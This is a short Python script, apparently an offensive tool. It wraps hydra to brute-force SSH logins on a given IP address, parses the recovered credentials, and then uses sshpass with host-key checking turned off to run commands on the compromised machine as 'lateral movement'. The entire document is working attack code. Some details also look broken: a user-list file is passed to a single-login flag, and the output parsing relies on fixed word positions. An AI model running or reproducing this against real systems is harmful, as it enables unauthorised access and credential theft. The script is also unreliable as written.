import subprocess
import os

def brute_ssh(ip, user_list, pass_list):
    # Use hydra to brute force SSH
    cmd = f"hydra -l {user_list} -P {pass_list} -t 4 ssh://{ip}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if "login:" in result.stdout:
        print("Brute force successful:", result.stdout)
        # Extract creds
        lines = result.stdout.split('\n')
        for line in lines:
            if "login:" in line:
                parts = line.split()
                user = parts[1]
                passw = parts[3]
                return user, passw
    return None, None

def lateral_move(ip, user, password):
    # Use ssh to execute command on remote
    cmd = f"sshpass -p {password} ssh -o StrictHostKeyChecking=no {user}@{ip} 'uname -a'"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    print("Lateral move result:", result.stdout)

if __name__ == "__main__":
    # Example
    user, pwd = brute_ssh("192.168.1.100", "/home/user/userlist.txt", "/home/user/passlist.txt")
    if user:
        lateral_move("192.168.1.100", user, pwd)